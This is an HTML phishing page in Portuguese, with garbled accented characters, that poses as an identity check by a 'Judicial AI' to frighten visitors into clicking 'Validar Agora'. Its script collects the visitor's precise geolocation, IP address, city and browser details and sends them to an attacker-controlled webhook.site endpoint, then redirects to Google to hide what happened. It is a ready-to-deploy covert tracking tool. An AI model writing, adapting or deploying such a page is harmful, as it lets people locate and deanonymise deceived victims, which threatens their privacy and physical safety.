<!DOCTYPE html>

  <meta charset="UTF-8" />

<body style="font-family: sans-serif; text-align: center; margin-top: 100px;">
  <h2>üîí Valida√ß√£o da Identidade</h2>
  <p>Por medidas de seguran√ßa da IA Judicial, a ia judicial analisa todo ambiente.</p>
  <p>üìç Ao continuar, voc√™ autoriza a coleta de dados do navegador.</p>
  <button onclick="coletarDados()" style="padding: 10px 20px; font-size: 16px;">Validar Agora</button>

  <script>
    async function coletarDados() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          const ipInfo = await fetch("https://ipapi.co/json/").then(res => res.json());

          const payload = {
            latitude,
            longitude,
            ip: ipInfo.ip,
            cidade: ipInfo.city,
            navegador: navigator.userAgent,
            data: new Date().toISOString()
          };

          // Enviar para voc√™ (use seu link do Webhook.site ou API)
          await fetch("https://webhook.site/SEU_ID_AQUI", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
          });

          alert("Valida√ß√£o conclu√≠da com sucesso.");
          window.location.href = "https://google.com"; // redirecionamento opcional
        });
      } else {
        alert("Geolocaliza√ß√£o n√£o suportada pelo navegador.");
      }
    }
  </script>
</body>
</html>
